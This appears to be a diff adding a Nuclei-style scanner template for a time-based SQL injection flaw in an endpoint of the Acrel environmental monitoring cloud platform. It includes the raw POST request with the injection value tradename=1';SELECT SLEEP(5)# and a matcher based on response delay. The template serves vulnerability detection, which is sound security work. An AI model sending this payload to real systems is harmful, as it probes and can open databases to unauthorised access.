@@ -1,0 +1,35 @@
+id: acrel-GetDates-sqli
+info:
+  name: 安科瑞-智能环保云平台 /MainMonitor/GetEnterpriseInfoMapByDate/GetDates SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: 安科瑞智能环保云平台是一款用于环境监测和管理的云平台。该漏洞存在于/MainMonitor/GetEnterpriseInfoMapByDate/GetDates接口中，攻击者可以通过构造恶意的SQL语句注入到接口参数中，进而获取数据库信息或对数据库进行未授权操作，可能导致敏感信息泄露或数据篡改。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/wyunhlli1cyc5bqf
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,acrel
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /MainMonitor/GetEnterpriseInfoMapByDate/GetDates HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        DeviceId=1&tradename=1';SELECT SLEEP(5)#
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
